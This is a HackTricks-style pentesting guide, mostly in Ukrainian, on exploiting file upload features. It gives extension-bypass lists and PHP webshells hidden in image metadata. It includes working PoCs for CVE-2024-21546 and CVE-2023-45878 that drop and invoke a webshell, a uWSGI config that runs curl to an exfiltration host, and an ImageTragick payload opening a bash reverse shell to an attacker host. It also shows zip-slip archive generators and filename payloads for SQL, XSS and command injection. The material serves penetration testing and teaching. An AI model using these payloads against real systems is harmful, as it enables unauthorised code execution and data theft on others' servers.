# Завантаження файлів

{{#include ../../banners/hacktricks-training.md}}

## Загальна методологія завантаження файлів

Інші корисні розширення:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Обхід перевірок розширень файлів

1. Якщо вони застосовуються, **перевірте** **попередні розширення**. Також протестуйте їх, використовуючи великі літери: _pHp, .pHP5, .PhAr ..._
2. _Спробуйте **додати дійсне розширення перед** виконуваним розширенням (також використовуйте попередні розширення):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Ви можете використовувати Burp для **bruteforce** всіх **ascii** і **Unicode** символів. (_Зауважте, що також можна спробувати використати **раніше** згадані **розширення**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обійти захист, **обдуривши парсер розширень** на сервері за допомогою технік, таких як **подвоєння** **розширення** або **додавання сміттєвих** даних (**null** байтів) між розширеннями. _Ви також можете використати **попередні розширення** для підготовки кращого payload'у._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один шар розширень** до попередньої перевірки:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте помістити **виконавче розширення перед допустимим розширенням** і сподівайтеся, що сервер неправильно налаштований. (корисно для експлуатації неправильних конфігурацій Apache, де будь-який файл з розширенням .php, але не обов'язково який завершується на .php, виконуватиме код):
- _ex: file.php.png_
7. Використання **NTFS alternate data stream (ADS)** у **Windows**. У цьому випадку символ двокрапки ":" буде вставлений після забороненого розширення і перед дозволеним. В результаті буде створено **порожній файл із забороненим розширенням** на сервері (наприклад "file.asax:.jpg"). Цей файл може бути пізніше редагований іншими техніками, наприклад використовуючи його short filename. Шаблон "**::$data**” також може бути використаний для створення непорожніх файлів. Тому додавання крапки після цього шаблону також може бути корисним для обходу подальших обмежень (наприклад "file.asp::$data.”)
8. Спробуйте перевантажити ліміти імені файлу. Дійсне розширення обрізається. А зловмисний PHP залишається. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Деякі обробники завантаження обрізають або нормалізують кінцеві крапки у збереженому імені файлу. В UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) версіях до 2.9.1 можна обійти валідацію розширень, зробивши наступне:

- Використати дійсний image MIME та magic header (наприклад, PNG’s `\x89PNG\r\n\x1a\n`).
- Назвати завантажений файл з PHP-розширенням і крапкою в кінці, наприклад `shell.php.`.
- Сервер видаляє кінцеву крапку і зберігає `shell.php`, який виконуватиметься, якщо буде розміщений у веб-доступному каталозі (за замовчуванням public storage, наприклад `/storage/files/`).

Мінімальний PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Потім зверніться до збереженого шляху (типово в Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Застосувати суворі серверні allowlists та повторно перевіряти збережену назву файлу.
- Розміщувати uploads у локаціях без можливості виконання.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Обійти перевірки **Content-Type**, встановивши **value** заголовка **Content-Type** в: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійти перевірку **magic number**, додавши на початок файлу **байти реального зображення** (заплутати _file_ команду). Або вставити шелл всередину **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або ви також можете **вставити payload безпосередньо** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо до вашого зображення додається **компресія**, наприклад за допомогою стандартних PHP-бібліотек на кшталт [PHP-GD](https://www.php.net/manual/fr/book.image.php), попередні техніки можуть не спрацювати. Однак ви можете використати **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **виживе після компресії**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може **змінювати розміри** зображення, використовуючи, наприклад, PHP-GD функції `imagecopyresized` або `imagecopyresampled`. Проте ви можете використати **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **виживе після компресії**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Інша техніка для створення payload, що **виживає при зміні розміру зображення**, використовуючи PHP-GD функцію `thumbnailImage`. Проте ви можете використати **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **виживе після компресії**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Знайти вразливість, що дозволяє **перейменувати** вже завантажений файл (щоб змінити розширення).
- Знайти вразливість **Local File Inclusion** для виконання backdoor.
- **Можливе розкриття інформації**:
1. Завантажити **кілька разів** (і одночасно) **той самий файл** з **тією самою назвою**
2. Завантажити файл з **назвою** файлу або папки, яка вже **існує**
3. Завантаження файлу з **"." , "..", або "…" як ім'я**. Наприклад, в Apache на **Windows**, якщо додаток зберігає uploaded файли в директорії "/www/uploads/", ім'я файлу "." створить файл uploads” в директорії "/www/".
4. Завантажити файл, який може бути важко видалити, наприклад **"…:.jpg"** в **NTFS**. (Windows)
5. Завантажити файл у **Windows** з **недопустимими символами** в імені, такими як `|<>*?”`. (Windows)
6. Завантажити файл у **Windows**, використовуючи зарезервовані (**заборонені**) імена, такі як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, та LPT9.
- Спробуйте також **завантажити виконуваний файл** (.exe) або **.html** (менш підозрілий), який **виконає код**, якщо його випадково відкриє жертва.

### Special extension tricks

Якщо ви намагаєтесь завантажувати файли на **PHP server**, перегляньте трюк з **.htaccess** для виконання коду: [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Якщо ви намагаєтесь завантажувати файли на **ASP server**, перегляньте трюк з **.config** для виконання коду: ../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files.

Файли `.phar` схожі на `.jar` для java, але для php, і можуть бути **використані як php файл** (виконуючись php, або підключаючись у скрипті...)

Розширення `.inc` іноді використовується для php-файлів, які лише **імпортуються**, тож інколи хтось може дозволити **виконання цього розширення**.

## **Jetty RCE**

Якщо ви можете завантажити XML-файл на Jetty server, ви можете отримати [RCE оскільки **нові *.xml та *.war автоматично обробляються**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Отже, як показано на зображенні нижче, завантажте XML-файл в `$JETTY_BASE/webapps/` і очікуйте shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Для детального вивчення цієї вразливості перегляньте оригінальне дослідження: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) вразливості можуть бути експлуатовані на uWSGI серверах, якщо існує можливість модифікувати `.ini` конфігураційний файл. uWSGI конфіг-файли використовують специфічний синтаксис для включення "magic" змінних, placeholder-ів та операторів. Особливо оператор '@', який використовується як `@(filename)`, призначений для включення вмісту файлу. Серед різних підтримуваних схем у uWSGI, схема "exec" є особливо потужною, дозволяючи читати дані з stdout процесу. Цю функціональність можна використати для зловмисних цілей, таких як Remote Command Execution або Arbitrary File Write/Read при обробці `.ini` конфіг-файлу.

Розгляньте наступний приклад шкідливого `uwsgi.ini` файлу, що демонструє різні схеми:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час парсингу конфігураційного файлу. Щоб конфігурація була активована та розпарсена, процес uWSGI має або перезапуститися (наприклад після крашу або через Denial of Service attack), або файл має бути налаштований на auto-reload. Функція auto-reload, якщо увімкнена, перезавантажує файл через задані інтервали при виявленні змін.

Критично важливо розуміти недбалість парсингу конфігураційних файлів uWSGI. Зокрема, обговорюваний payload може бути вставлений у бінарний файл (наприклад, зображення або PDF), що ще більше розширює можливі вектори експлуатації.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (сервер ігнорує type/name, base64-декодує хвіст)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Закинути мінімальний webshell і виконати команди:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Примітки:
- Обробник виконує `base64_decode($_POST["img"])` після розділення за `;` і `,`, потім записує байти в `$absolutePath . '/' . $_POST['path']` без перевірки розширення/типу.
- Отриманий код виконується від імені користувача веб-сервісу (наприклад, XAMPP Apache на Windows).

Джерела цієї вразливості включають повідомлення від usd HeroLab та запис у NVD. Див. розділ References нижче.

## **wget File Upload/SSRF Trick**

Іноді можна виявити, що сервер використовує **`wget`** для **завантаження файлів** і ви можете **вказати** **URL**. У таких випадках код може перевіряти, що розширення завантажуваних файлів знаходиться у whitelist, щоб гарантувати завантаження лише дозволених файлів. Однак, **цій перевірці можна обійти.**\
Максимальна довжина імені файлу в **linux** — **255**, проте **wget** обрізає імена файлів до **236** символів. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### Обхід каталогу завантажень через NTFS junctions (Windows)

(Для цієї атаки вам знадобиться локальний доступ до Windows-машини) Коли uploads зберігаються в per-user підпапках на Windows (e.g., C:\Windows\Tasks\Uploads\<id>\) і ви контролюєте створення/видалення цієї підпапки, ви можете замінити її на directory junction, що вказує на чутливе розташування (e.g., the webroot). Наступні uploads будуть записані в цільовий шлях, що дає змогу виконання коду, якщо ціль інтерпретує server‑side code.

Приклад потоку для перенаправлення uploads у XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Примітки
- mklink /J створює NTFS directory junction (reparse point). Обліковий запис веб‑сервера має слідувати за junction і мати права запису в місці призначення.
- Це перенаправляє довільні записи файлів; якщо ціль виконує скрипти (PHP/ASP), це перетворюється на RCE.
- Захист: не дозволяйте writable upload roots бути attacker‑controllable під C:\Windows\Tasks або подібними; блокувати створення junction; валідувати extensions на стороні сервера; зберігати uploads на окремому томі або з deny‑execute ACLs.

## Інструменти

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) — потужний інструмент, призначений для допомоги Pentesters і Bug Hunters у тестуванні file upload mechanisms. Він використовує різні bug bounty techniques, щоб спростити процес виявлення та експлуатації вразливостей, забезпечуючи ретельну оцінку веб‑застосунків.

### Corrupting upload indices with snprintf quirks (historical)

Деякі застарілі upload handlers, які використовують `snprintf()` або подібні функції для побудови multi-file масивів із single-file upload, можна обдурити, щоб сфабрикувати структуру `_FILES`. Через невідповідності й усікання в поведінці `snprintf()`, ретельно сформований single upload може виглядати як кілька проіндексованих файлів на стороні сервера, вводячи в оману логіку, яка очікує сувору форму (наприклад, трактує це як multi-file upload і переходить на небезпечні гілки). Хоча сьогодні це рідко, цей патерн “index corruption” час від часу зʼявляється в CTF та старих кодових базах.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Якщо ви можете вказати веб‑серверу завантажити зображення з URL, ви можете спробувати зловживати [SSRF](../ssrf-server-side-request-forgery/index.html). Якщо це **image** буде **saved** на якомусь public сайті, ви також можете вказати URL з [https://iplogger.org/invisible/](https://iplogger.org/invisible/) і **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Спеціально створені PDF для XSS: на [наступній сторінці показано, як **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Якщо ви можете upload PDFs, ви можете підготувати PDF, який виконуватиме довільний JS згідно з наведеними вказівками.
- Завантажте вміст \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) щоб перевірити, чи є на сервері **antivirus**
- Перевірте, чи існує **size limit** при завантаженні файлів

Ось топ‑10 речей, яких можна досягти через завантаження (взято з [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Магічні заголовкові байти

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Див. [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) для інших filetypes.

## Zip/Tar File Automatically decompressed Upload

Якщо ви можете завантажити ZIP, який буде розпакований на сервері, ви можете зробити 2 речі:

### Symlink

Завантажте архів, що містить symbolic links на інші файли; потім, отримавши доступ до розпакованих файлів, ви звертатиметеся до linked файлів:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпаковка в різні папки

Несподіване створення файлів у директоріях під час розпакування є серйозною проблемою. Незважаючи на початкові припущення, що така конфігурація може захищати від виконання команд на рівні ОС через шкідливі завантаження файлів, підтримка ієрархічної компресії та можливості обходу директорій формату ZIP можуть бути використані зловмисниками. Це дозволяє атакам обходити обмеження та виходити з безпечних директорій для завантаження, маніпулюючи функцією розпакування цільового додатка.

Автоматизований exploit для створення таких файлів доступний за адресою [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Утиліту можна використовувати так:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Крім того, варто розглянути опцію **symlink trick with evilarc**. Якщо мета — націлитися на файл, наприклад `/flag.txt`, у вашій системі слід створити symlink на цей файл. Це гарантує, що evilarc не зіткнеться з помилками під час своєї роботи.

Нижче наведено приклад коду Python, який використовується для створення зловмисного zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Зловживання стисненням для file spraying**

For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Написано PHP-код для виконання команд, переданих через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Створюється кілька файлів і формується zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Імена файлів всередині zip змінюються за допомогою vi або hex editor — замінюючи "xxA" на "../" для переходу між каталогами.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб експлуатувати вразливість **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP shell у PNG

Вбудовування PHP shell в IDAT chunk PNG-файлу може ефективно обходити певні операції обробки зображень. Функції `imagecopyresized` і `imagecopyresampled` з PHP-GD особливо релевантні в цьому контексті, оскільки вони зазвичай використовуються для зміни розміру та ресемплінгу зображень відповідно. Здатність вбудованого PHP shell залишатися неушкодженим при виконанні цих операцій є вагомою перевагою для певних сценаріїв.

Детальне дослідження цієї техніки, включаючи методологію та потенційні застосування, наведено в наступній статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Цей ресурс дає ґрунтовне розуміння процесу та його наслідків.

Детальніше: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot Files слугують унікальним інструментом у кібербезпеці, виступаючи хамелеонами, які можуть легітимно існувати в кількох форматах файлів одночасно. Прикладом є [GIFAR](https://en.wikipedia.org/wiki/Gifar), гібрид, який функціонує як GIF і RAR-архів. Такі файли не обмежуються цією парою; також можливі комбінації типу GIF і JS або PPT і JS.

Основна користь polyglot-файлів полягає в їхній здатності обходити заходи безпеки, які фільтрують файли за типом. Звична практика в різних застосунках полягає в дозволі лише певних типів файлів для завантаження — наприклад, JPEG, GIF або DOC — щоб зменшити ризик від потенційно шкідливих форматів (наприклад, JS, PHP або Phar). Однак polyglot, відповідаючи структурним критеріям кількох форматів файлів, може непомітно обходити ці обмеження.

Незважаючи на адаптивність, у polyglot-файлів є і обмеження. Наприклад, хоча polyglot може одночасно бути PHAR (PHp ARchive) і JPEG, успішність його завантаження може залежати від політики платформи щодо розширень файлів. Якщо система суворо фільтрує за допустимими розширеннями, сама лише структурна подвійність polyglot може не гарантувати успіх завантаження.

Детальніше: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Завантаження валідних JSON, ніби це PDF

Як уникнути виявлення типу файлу, завантаживши валідний JSON-файл, навіть якщо це не дозволено, підробивши PDF-файл (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Поки magic-байти `%PDF` знаходяться в перших 1024 байтах, файл вважається валідним (див. приклад у пості)
- **`pdflib` library**: Додайте фейковий PDF-формат всередину поля JSON, щоб бібліотека вважала його PDF (див. приклад у пості)
- **`file` binary**: Воно може читати до 1048576 байт з файлу. Просто створіть JSON більший за цей розмір, щоб воно не змогло розпізнати вміст як JSON, а потім всередині JSON вставте початкову частину реального PDF — і воно вважатиме файл PDF

## Посилання

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
